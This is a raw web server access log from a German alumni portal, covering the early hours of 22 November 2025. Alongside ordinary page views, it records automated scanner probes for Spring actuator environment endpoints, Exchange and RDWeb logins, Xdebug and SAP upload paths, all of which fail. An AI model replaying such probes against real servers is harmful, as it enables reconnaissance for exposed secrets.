user;timestamp;referer;target;method;status
55ba1f31e330352661b43d3275dad2a303675546c75fe98bef1d75f73056674c;2025-11-22 01:48:40;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
834632ccda6f506d3095672bc914276848ea1fe922049d1f6df9e6f34a3c7728;2025-11-22 01:53:23;;/personen/alumni/schule/191073;GET;200
671cef73f044f48d0802e94cf6035fe035ef6b7ce88bc04898db2e74c3c8d1cd;2025-11-22 02:00:52;;/;GET;200
896be1ffb67e4d65cb28b1898cdddb712f7037dae70904ed94d3e50bdabf4411;2025-11-22 02:02:10;;/personen/alumni/schule/59043;GET;200
b8b371a672032d9dc93cea57e1d24867be43880e47610747e200141eb438f1d4;2025-11-22 02:10:58;;/personen/alumni/schule/185826;GET;200
497d98eecfa509547cd2c2cea0dfd43ba7d56d77494b8532d8428c2a97a683ab;2025-11-22 02:14:55;;/;GET;200
7f9e5633cb0366660f4c079fb29a03c940a31209b9824fbfb0cf29d1a23d02e5;2025-11-22 02:16:27;;/;GET;200
a1925d4bbf3e7b9b7462bbb437f70a37dd98f164e8df91559cec498602b8942b;2025-11-22 02:18:45;;/personen/alumni/schule/190627;GET;200
0ad36cfa3b3397cadd2b2a7ef00452e2f728944daf824d7e24ad67d3bcec00a4;2025-11-22 02:20:29;;/owa/auth/logon.aspx;GET;404
f572ed465c294c1a7d6b36df5d2759779c59f885950e51f22d35d5459e413bbd;2025-11-22 02:21:49;/c/;/c/;GET;404
f4441aeef77c9428c799cb8b25576967ec2fb4d81944980eb03b8fd3e4a80cc8;2025-11-22 02:21:50;;/personen/alumni/schule/5506;GET;200
af0593c406b467d28ec0412d7d87155abbec51ad9d4ed9fd86953627bff875d6;2025-11-22 02:24:30;;/RDWeb/Pages/;GET;404
3e513e6169af85c8a9a91795a9bedc61de158339182e8f9d12210b38ba7a0460;2025-11-22 02:31:37;;/themen/details/der-start-ins-studium;GET;200
a13d9744ab6643c5a59b2a3af51c93d4b72eb583033d9cd853dad56c61e581eb;2025-11-22 02:37:23;;/personen/alumni/schule/MP003;GET;200
2a566da820b2b79ad2f6e00911e466d0c29699fd486022af32c00c9e3bbdeeae;2025-11-22 02:44:30;;/rechtliches/datenschutz;GET;200
9d7b6f0422c662d0d6d2d62e77f3586b1ddf3e6d4dce278fb314c441c0a50fcb;2025-11-22 02:45:43;;/personen/alumni/schule/164045;GET;200
049aba1984d9e62ac70a68426cd422ee993d1cb2bdce2a848facdaa71763810c;2025-11-22 02:50:31;;/personen/alumni/schule/190962;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-22 02:52:47;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
82010297fa9142be651c3d2c2c582a29e51b09031521d2caffde02b8e83224ed;2025-11-22 02:58:07;;/954-238-1736;GET;404
6f8938be6ce25a1071a31bc8ec2726f123cb90ce6dc6305f02d72100198b51ee;2025-11-22 02:58:13;;/3437963199;GET;404
9be024c272d29a897683629ab3274b6c6c973b0a21a92faefa41b99aa13651f7;2025-11-22 03:01:26;;/;GET;200
0764d84419c08f57713e96ffb7c66b7ab7a64cdf2d548580829a84ba32137dbb;2025-11-22 03:06:00;;/personen/alumni/schule/65262;GET;200
ba44aefb1e96b2ab0d6d0c04271cfffa1c7f153f0d9e1a62bd305479b39b569b;2025-11-22 03:09:55;;/rechtliches/green-data;GET;200
fee32e92cd29c0fc6b0e1ef76d83bf82497d4e26121cf0d658d65927427d4e8d;2025-11-22 03:14:58;;/personen/alumni/schule/164094;GET;200
f38a109ae57e12e35321944f0fc0fbfa28762b997d6adc68a3c1f20bc0f26123;2025-11-22 03:21:20;;/personen/alumni/schule/09A05;GET;200
be5931cbddcadc4d03d4c047b5c61de457c479348d88b9208be9fe20a1abf728;2025-11-22 03:25:44;;/;GET;200
4e5937c56de9e6d7fc7e598c76a22934757f45bf9bdfbf32a266f8cd9bbcf6da;2025-11-22 03:33:16;;/personen/alumni/schule/183052;GET;200
7fc14d49b868fcd06280763882580a0696ba7d7a1172cfe84d6da2a7d8b6ebb8;2025-11-22 03:36:22;;/personen/alumni/schule/185826;GET;200
5ce8d5931cfb7f6abb14de4abae5cecfdb33c80a7362fd2a1ae93da9a860369b;2025-11-22 03:40:05;/;/;GET;200
9d1d62c5a3ad46fb7199063c57773d08cd51bb07ae73ba6e1770f2e3f23fd35d;2025-11-22 03:41:51;;/;GET;200
58e125ccd5921b0f2eef85c5f0bd8b7a37b14ce4c66c985ef23e482a9b06e4b3;2025-11-22 03:43:10;;/personen/alumni/schule/170690;GET;200
cb151998ab0f5ac4eb9c02c3e3cf6de2c368ed373962d2e29383030a7f465f11;2025-11-22 03:44:04;;/;GET;200
08fb9e7a94938ee9167083457dfafeeb07fcc029e657d94aac4bd0be20d4b343;2025-11-22 03:53:33;;/personen/alumni/schule/59026;GET;200
9d7b6f0422c662d0d6d2d62e77f3586b1ddf3e6d4dce278fb314c441c0a50fcb;2025-11-22 04:02:56;;/personen/alumni/schule/5502;GET;200
09e9ec5c13c1030446d57d9375fde3d05cf848be6afd1c643a8b5fecd3fadc5c;2025-11-22 04:08:20;;/personen/alumni/schule/190627;GET;200
73c90c1ff3769c04338d0eb38478a6f65937dea6d0f8166ff231844175b9acc7;2025-11-22 04:08:55;;/;GET;200
accd5e2bd9206f3f1ac5d4dd4222cd845ef036f594a6cea57e57f9da0266c3d5;2025-11-22 04:24:00;;/personen/alumni/schule/4240016;GET;200
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:25:41;/env;/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:25:45;/mappings.json;/mappings.json;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:25:49;/info;/info;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:25:51;/env.json;/env.json;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:25:53;/actuator/;/actuator/;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:25:59;/actuator/mappings;/actuator/mappings;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:26:02;/staging/mappings;/staging/mappings;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:26:06;/staging/actuator/env;/staging/actuator/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:26:08;/staging/actuator/mappings;/staging/actuator/mappings;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:26:13;/test/mappings;/test/mappings;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:26:18;/test/actuator/mappings;/test/actuator/mappings;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:26:21;/v2/actuator/mappings;/v2/actuator/mappings;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:26:23;/test/actuator/env;/test/actuator/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:26:26;/v2/actuator/env;/v2/actuator/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:26:30;/v2/mappings;/v2/mappings;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:26:34;/actuator/env;/actuator/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:26:37;/actuator/,/env;/actuator/,/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:26:43;/api/actuator/;/api/actuator/;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:26:46;/api/actuator/env;/api/actuator/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:26:50;/api/actuator/,/env;/api/actuator/,/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:26:53;/management/;/management/;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:26:59;/management/mappings;/management/mappings;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:27:02;/management/env;/management/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:27:05;/management/,/env;/management/,/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:27:09;/dev/actuator/;/dev/actuator/;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:27:13;/dev/actuator/env;/dev/actuator/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:27:17;/app/actuator/;/app/actuator/;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:27:21;/app/actuator/env;/app/actuator/env;GET;404
d9bec6cab084b4235de8f09e4410dc7115977a3d4e0984541856f745ea76591e;2025-11-22 04:29:44;;/;GET;200
c717e8c0ea77dec413e7ae063fa838a8b532971c3fe37a52bdf6bde6d17461fa;2025-11-22 04:32:22;;/personen/alumni/schule/4340014;GET;200
a2e6a0b971d5dbbee7f67ccf8b1df6c741938e8ee095a6ef6a5e54099220f9e5;2025-11-22 04:35:37;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
03b8d4ab6806ede9d4317d49efc1625306c22d9855b21130ce75cf8c761dd616;2025-11-22 04:40:22;;/;GET;200
eb639149a613179817bc4e64920b2f932d6577755ff6999fed00f2838d8a8595;2025-11-22 04:43:11;;/personen/alumni/schule/59043;GET;200
3f8a7625906793f843318b1a273de2f7ff563bbdc98e9eebb9e3b3a8f4f12190;2025-11-22 04:43:35;;/suchergebnisse;GET;302
3f8a7625906793f843318b1a273de2f7ff563bbdc98e9eebb9e3b3a8f4f12190;2025-11-22 04:43:41;/suchergebnisse;/;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-22 04:57:34;;/?XDEBUG_SESSION_START=phpstorm;GET;200
3c94e2bbbf0fd73aeb866f9eb1206124dc7215969c7f0f260ffd0c9d062ef24b;2025-11-22 05:13:57;;/personen/alumni/schule/190627;GET;200
b4cd046a3b99801becf0430969055d26bcb52bb668c4549411a9657d666a9a38;2025-11-22 05:14:23;;/personen/alumni/schule/HB0001;GET;200
1f7e1a300826b992950dfa3eb079a4ddc8c540f5c694c48849f01a07419abdbd;2025-11-22 05:18:31;/media/system/js/core.js;/media/system/js/core.js;GET;404
1f7e1a300826b992950dfa3eb079a4ddc8c540f5c694c48849f01a07419abdbd;2025-11-22 05:18:32;/wp-includes/js/jquery/jquery.js;/wp-includes/js/jquery/jquery.js;GET;404
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-22 05:18:33;/themen/details/abschied-aus-moabit;/themen/details/uni-zwischen-ebbe-und-flut;GET;200
58a1896198325ee0b0720f06c10dd11cfb90d42d780c8f373fbdad00a1391d11;2025-11-22 05:20:35;;/ab2g;GET;404
58a1896198325ee0b0720f06c10dd11cfb90d42d780c8f373fbdad00a1391d11;2025-11-22 05:20:37;;/ab2h;GET;404
58a1896198325ee0b0720f06c10dd11cfb90d42d780c8f373fbdad00a1391d11;2025-11-22 05:20:38;;/alive.php;GET;404
58a1896198325ee0b0720f06c10dd11cfb90d42d780c8f373fbdad00a1391d11;2025-11-22 05:20:45;;/;GET;200
58a1896198325ee0b0720f06c10dd11cfb90d42d780c8f373fbdad00a1391d11;2025-11-22 05:20:47;;/;GET;200
58a1896198325ee0b0720f06c10dd11cfb90d42d780c8f373fbdad00a1391d11;2025-11-22 05:20:49;;/teorema505?t=1;GET;404
94d10329701f972a4e9560982dcbf915d8d5021b7b3e7844d5e51d93ed97c11c;2025-11-22 05:21:44;;/personen/alumni/schule/SL001;GET;200
21c489e43f4db89683f76d049446007e01b73af471681bd7c622f07c80a0ea7d;2025-11-22 05:23:29;;/;GET;200
248fd95664548b86ca2725400f81e0f9509885ef75157ae2de91cbe4298f5614;2025-11-22 05:28:07;;/;GET;200
248fd95664548b86ca2725400f81e0f9509885ef75157ae2de91cbe4298f5614;2025-11-22 05:28:07;;/;GET;200
248fd95664548b86ca2725400f81e0f9509885ef75157ae2de91cbe4298f5614;2025-11-22 05:28:07;;/;GET;200
163fc7d30b42abc08e91b21b7c03e5c98ec32013f24e4eddacf46a89b461d206;2025-11-22 05:28:13;;/;GET;200
163fc7d30b42abc08e91b21b7c03e5c98ec32013f24e4eddacf46a89b461d206;2025-11-22 05:28:33;/;/;GET;200
dcda3cc89e0c539b6016c7d8f3eb437d4fe6950a9124ab5077c330d79b395e42;2025-11-22 05:34:15;/;/;GET;200
5d06ed8cfcc2fc53c12800f0a1931005367a4917c066e5e22a2a591e0fb0cb1a;2025-11-22 05:44:02;/;/;PROPFIND;405
f62e58ef9475731552f7e3e7d8d4cad0ffd5fb03d12b18d6f84bc23916674488;2025-11-22 05:44:52;;/personen/alumni/schule/5505;GET;200
606da49eb1b1965aecf784626c760e01a116aac1c6527c422a13429038da75ce;2025-11-22 05:45:25;;/;GET;200
579bbca7e45e3285bc44180ee850c92994443ccebd5c7a97fce1bb958bed43e9;2025-11-22 05:49:01;;/themen/details/der-start-ins-studium;GET;200
68448c5f9c0cfe0f84ac31afaa78b1640aef9644f45602cc7fe73d9f48457008;2025-11-22 05:51:29;;/developmentserver/metadatauploader;GET;404
c9b5d1d32bed002fc9f4e467261c6b01d736b0ccdc0e1399307dcc2d1694086d;2025-11-22 05:52:31;;/;GET;200
2165aa3c629e8890ec05724182e9f3d0673d40f4bd7ee7840fef454a883e57c8;2025-11-22 05:58:06;;/;GET;200
62f1b68d128294ddb8c10e270c3f6110f626411b9d49277ee0dc576b56788112;2025-11-22 06:01:59;;/;GET;200
a6790d60a003bdf978c75ccd8f0146fc7dac5aa6b3d26d94936e34a6f5d88083;2025-11-22 06:12:29;;/;GET;200
0a2f9383280bff3b62158e80b7e4b644b9c975f539efaebc1a0b1795b97570ac;2025-11-22 06:13:44;;/;GET;200
5d06ed8cfcc2fc53c12800f0a1931005367a4917c066e5e22a2a591e0fb0cb1a;2025-11-22 06:16:44;/;/;PROPFIND;405
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:17:52;/env;/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:17:55;/mappings.json;/mappings.json;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:00;/info;/info;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:03;/env.json;/env.json;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:08;/actuator/;/actuator/;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:09;/actuator/mappings;/actuator/mappings;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:11;/staging/mappings;/staging/mappings;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:13;/staging/actuator/env;/staging/actuator/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:15;/staging/actuator/mappings;/staging/actuator/mappings;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:18;/test/mappings;/test/mappings;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:23;/test/actuator/mappings;/test/actuator/mappings;GET;404
62f1b68d128294ddb8c10e270c3f6110f626411b9d49277ee0dc576b56788112;2025-11-22 06:18:23;;/;GET;200
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:25;/v2/actuator/mappings;/v2/actuator/mappings;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:28;/test/actuator/env;/test/actuator/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:33;/v2/actuator/env;/v2/actuator/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:34;/v2/mappings;/v2/mappings;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:35;/actuator/env;/actuator/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:37;/actuator/,/env;/actuator/,/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:40;/api/actuator/;/api/actuator/;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:45;/api/actuator/env;/api/actuator/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:47;/api/actuator/,/env;/api/actuator/,/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:49;/management/;/management/;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:51;/management/mappings;/management/mappings;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:55;/management/env;/management/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:59;/management/,/env;/management/,/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:19:02;/dev/actuator/;/dev/actuator/;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:19:05;/dev/actuator/env;/dev/actuator/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:19:08;/app/actuator/;/app/actuator/;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:19:12;/app/actuator/env;/app/actuator/env;GET;404
be4b0b647254c1d3c32347e29419885056169144761f8bb89b9349d0028b6637;2025-11-22 06:22:22;;/;GET;200
2a566da820b2b79ad2f6e00911e466d0c29699fd486022af32c00c9e3bbdeeae;2025-11-22 06:22:42;;/personen/alumni/schule/190627;GET;200
3d26b1ba38a2b067d2d9cdb27e80b45e14a75bdb972c7e2a4a340184077f948f;2025-11-22 06:27:04;;/themen/details/der-start-ins-studium;GET;200
3abdba58782dc7051e9aea66fa1b1185e9e99373c2e800cb21107390a2e1a74e;2025-11-22 06:35:11;/;/;GET;200
a6358c16800dc001dec3fa61b24dcec8134a91882323a20eff094fcc57038086;2025-11-22 06:36:13;;/themen/details/abschied-aus-moabit;GET;200
6e9cf7261ef52110b8c283d90853e230532bf54fcf48eaee97e7070c4d80c65d;2025-11-22 06:45:42;;/;GET;200
9848721278c322723fb490d875f7a6fe02087753abbc23ec35875ef817ce4622;2025-11-22 06:47:42;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
6e9cf7261ef52110b8c283d90853e230532bf54fcf48eaee97e7070c4d80c65d;2025-11-22 06:50:04;;/webui/;GET;404
e9d23766def591482959fd656153dd049c0f2b4e2d502820b91b464c2580465f;2025-11-22 06:51:00;;/;GET;200
523ad906cf9fca20a718c01c912d3995c2292a861b5e0ac8c52e5ad3759b1e23;2025-11-22 06:51:00;;/themen?category=bildung;GET;200
29cae18f927d15103199e7e1758489715b68adf5bd337af283ad1a7faec97e72;2025-11-22 06:55:24;;/;GET;200
e9d23766def591482959fd656153dd049c0f2b4e2d502820b91b464c2580465f;2025-11-22 06:56:30;;/personen;GET;200
9bb3fb21a76ae6a5cc98cddd293ec8809d319c9e3889b847ada4392f96009177;2025-11-22 06:57:10;;/personen/alumni/schule/59043;GET;200
5d06ed8cfcc2fc53c12800f0a1931005367a4917c066e5e22a2a591e0fb0cb1a;2025-11-22 06:58:26;/;/;PROPFIND;405
b061806b17cca8de77e34afcab7ecf5f2d97fdf63aeafa1dc1765e1d46e27a04;2025-11-22 06:59:43;;/;GET;200
b061806b17cca8de77e34afcab7ecf5f2d97fdf63aeafa1dc1765e1d46e27a04;2025-11-22 06:59:45;;/personen;GET;200
b061806b17cca8de77e34afcab7ecf5f2d97fdf63aeafa1dc1765e1d46e27a04;2025-11-22 06:59:45;;/themen/details/abschied-aus-moabit;GET;200
b061806b17cca8de77e34afcab7ecf5f2d97fdf63aeafa1dc1765e1d46e27a04;2025-11-22 06:59:45;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
b061806b17cca8de77e34afcab7ecf5f2d97fdf63aeafa1dc1765e1d46e27a04;2025-11-22 06:59:45;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
b061806b17cca8de77e34afcab7ecf5f2d97fdf63aeafa1dc1765e1d46e27a04;2025-11-22 06:59:45;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
6e9cf7261ef52110b8c283d90853e230532bf54fcf48eaee97e7070c4d80c65d;2025-11-22 07:06:23;;/geoserver/web/;GET;404
3cb80ea505857c238082915d49a7a952c3f26121faea4fdca2d44a1279ffd321;2025-11-22 07:07:26;;/aktuelles/stellenangebote;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-22 07:07:45;/themen/details/abschied-aus-moabit;/themen?category=politik;GET;200
a31306057511df7b34d97fd6c9e5a608d345b53bf166636bd319fb37f20d0b7f;2025-11-22 07:08:37;;/aktuelles/stellenangebote;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-22 07:09:07;/gruppen/hobby/malen-und-zeichnen;/gruppen/hobby/programmieren;GET;302
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-22 07:09:09;/gruppen/hobby/malen-und-zeichnen;/gruppen;GET;200
23c747c26d9f122e0e1654fcb547c3a7f078e0cb0c6f2f565175d0a1ab9d196d;2025-11-22 07:10:40;;/;GET;200
4d594e973e3a2b8f518335c719ec16a07e37a3d993a1b74242286384ba5398f4;2025-11-22 07:13:20;;/aktuelles/meldungen?category=wissenschaft;GET;200
36b7b73e115bcf8095506612fbbfcf26d87042c20925e337ba72f36cd8dc079c;2025-11-22 07:14:24;;/themen/details/abschied-aus-moabit;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-22 07:17:16;;/actuator/gateway/routes;GET;404
0d70af07f80b83da451154ff1dc0e762d81adc3aefa8e0d86b0cdb5ff0a645f7;2025-11-22 07:18:14;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
f24766118e548f4a46d9aed498bd919906a91fb124f8dfafbf7e664ebbde448d;2025-11-22 07:23:33;;/themen/details/was-kommt-nach-dem-abitur;GET;200
02c7f07950ea476df86662d4d439ae896002b84f0776095b4c9625bf88a280a3;2025-11-22 07:26:14;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
b6f3124cafde9ded3cc1bb9399d5537476c9b7216353157d2d04d02273874637;2025-11-22 07:28:10;;/docs/img/gleichrichterV2.png;GET;404
d2234e42d5f52c8b7356e6d345e16531c8c01bd9ecd2596022f5938b932a43a7;2025-11-22 07:32:34;;/personen/alumni/schule/185826;GET;200
138fc50186f92c8a518c5dab8fce9c2e490bd06e5c41fb2466351bf998bf6fe7;2025-11-22 07:33:52;;/themen/details/david-gegen-goliath;GET;200
917e2ce768ddd61971f81829609fcabe5b1ae4d9b166b1a15e10571d4eea8434;2025-11-22 07:34:23;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
f7c2aa83f3b775486e39503e8a94edeaccd8b1898089c086e59352a4db4082e6;2025-11-22 07:38:20;;/;GET;200
2cf67e681332db32e149d635a31715214df58bf8f5f4d1853a969e6161d376ac;2025-11-22 07:44:22;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
bb4a165bbc76ea7dff873306e9bee1a028f9193be5e1f5c521fc5b0257423669;2025-11-22 07:50:14;;/;GET;200
cdba9cd45d5a48f26b2fe2ac4ddcd59ebc21dd941868632713695832bb592f7a;2025-11-22 07:50:44;;/themen/2;GET;200
